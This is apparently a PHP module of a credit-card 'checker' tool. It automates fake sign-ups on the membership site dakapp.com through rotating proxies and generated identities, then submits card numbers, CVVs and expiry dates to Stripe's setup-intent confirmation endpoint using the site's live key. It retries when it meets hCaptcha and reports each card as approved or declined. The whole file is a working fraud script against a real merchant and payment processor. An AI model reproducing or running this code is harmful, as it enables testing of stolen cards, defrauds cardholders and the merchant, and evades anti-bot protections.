<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$r1 = $this->curlx->Get('https://www.dakapp.com/register/standard', null, $cookie, $server['proxy']);

if (!$r1->success) {
	$empty = ''.$r1->error.'! ('.intval($r1->errno).')';

	goto start;
}

$pm_id = $this->getstr($r1->body, '"mepr_payment_method" value="', '"');

if (empty($pm_id)) {
	$empty = 'First Request Token is Empty!';

	goto start;
}

$data = [
	'mepr_process_signup_form' => 'Y',
	'mepr_product_id' => '1501',
	'mepr_stripe_txn_amount' => '399',
	'user_first_name' => $fake->first,
	'user_last_name' => $fake->last,
	'mepr-address-one' => '12 main street',
	'mepr-address-two' => '',
	'mepr-address-city' => 'Brewster',
	'mepr-address-country' => 'US',
	'mepr-address-state' => 'NY',
	'mepr-address-zip' => '10509',
	'mepr_instruments[double-bass]' => 'on',
	'mepr-geo-country' => '',
	'user_login' => $fake->user,
	'user_email' => $fake->email,
	'mepr_user_password' => 'tokenCookie',
	'mepr_user_password_confirm' => 'tokenCookie',
	'mepr_coupon_code' => '',
	'mepr_payment_method' => $pm_id,
	'mepr_agree_to_tos' => 'on',
	'mepr_agree_to_privacy_policy' => 'on',
	'mepr_no_val' => ''
];

$r2 = $this->curlx->Post('https://www.dakapp.com/register/standard', http_build_query($data), null, $cookie, $server['proxy']);

if (!$r2->success) {
	$empty = ''.$r2->error.'! ('.intval($r2->errno).')';

	goto start;
}

$transaction_id = $this->getstr($r2->body, 'mepr_transaction_id" value="', '"');

if (empty($transaction_id)) {
	$empty = 'Second Request Token is Empty!';

	goto start;
}

$data = [
	'mepr_transaction_id' => $transaction_id,
	'address_required' => '1',
	'card-address-one' => '12 main street',
	'card-address-two' => '',
	'card-address-city' => 'Brewster',
	'card-address-country' => 'US',
	'card-address-state' => 'NY',
	'card-address-zip' => '10509',
	'card-name' => $fake->first.' '.$fake->last,
	'action' => 'mepr_stripe_create_payment_client_secret',
	'mepr_current_url' => 'https://www.dakapp.com/register/standard?action=checkout&txn=ww#mepr_jump',
	'mepr_payment_method' => $pm_id
];

$r3 = $this->curlx->Post('https://www.dakapp.com/wp-admin/admin-ajax.php', http_build_query($data), null, $cookie, $server['proxy']);

if (!$r3->success) {
	$empty = ''.$r3->error.'! ('.intval($r3->errno).')';

	goto start;
}

$json_r3 = json_decode($r3->body);

if (!$json_r3->success || !isset($json_r3->client_secret, $json_r3->setup_intent_id)) {
	$empty = 'Third Request Tokens is Empty!';

	goto start;
}

$client_secret = $json_r3->client_secret;

$setup_intent_id = $json_r3->setup_intent_id;

$data = 'return_url=https%3A%2F%2Fwww.dakapp.com%2Fwp-admin%2Fadmin-ajax.php%3Faction%3Dmepr_confirm_stripe_setup%26method%3D'.$pm_id.'&payment_method_data[type]=card&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_year]='.$yy.'&payment_method_data[card][exp_month]='.$mm.'&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[billing_details][address][country]=US&payment_method_data[payment_user_agent]=stripe.js%2F72c5b37d6%3B+stripe-js-v3%2F72c5b37d6%3B+payment-element&payment_method_data[time_on_page]='.rand(50000, 100000).'&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51LVYHlBuvp3UETlNa0Am8nLf7kU8j3Bo0VrfaWo1En79W2u0KV8TMmMboRUV33cbi4gTqJxBm3qcU8q8uz0RmMDj00Zwy7axln&_stripe_version=2020-03-02&client_secret='.$client_secret;

$r4 = $this->curlx->Post('https://api.stripe.com/v1/setup_intents/'.$setup_intent_id.'/confirm', $data, null, $cookie, $server['proxy']);

if (!$r4->success) {
	$empty = ''.$r4->error.'! ('.intval($r4->errno).')';

	goto start;
}

if (strpos($r4->body, 'verify_challenge') !== false) {
	$empty = 'Fourth Request Contains HCaptcha!';

	goto start;
}

$json_r4 = json_decode($r4->body);

if (isset($json_r4->error)) {
	$status = $this->response->ErrorHandler($json_r4->error);

	goto end;
}

$status = $this->response->Stripe($r4->body, null, 'auth');

end: